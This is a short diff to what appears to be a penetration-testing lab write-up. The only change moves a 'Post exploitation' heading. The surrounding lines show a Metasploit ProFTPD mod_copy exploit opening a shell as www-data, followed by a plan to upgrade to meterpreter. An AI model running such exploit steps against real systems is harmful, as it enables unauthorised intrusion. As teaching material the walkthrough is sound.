@@ -100,7 +100,6 @@ msf6 exploit(unix/ftp/proftpd_modcopy_exec) > run
 
 Success, we now have a shell to work with!
 
-## Postexploitation
 ```
 msf6 exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 1
 [*] Starting interaction with 1...
@@ -111,6 +110,7 @@ bash: no job control in this shell
 www-data@ubuntu:/var/www/html$ 
 ```
 
+## Post exploitation
 Now, let's try for a meterpreter:
 
 ```
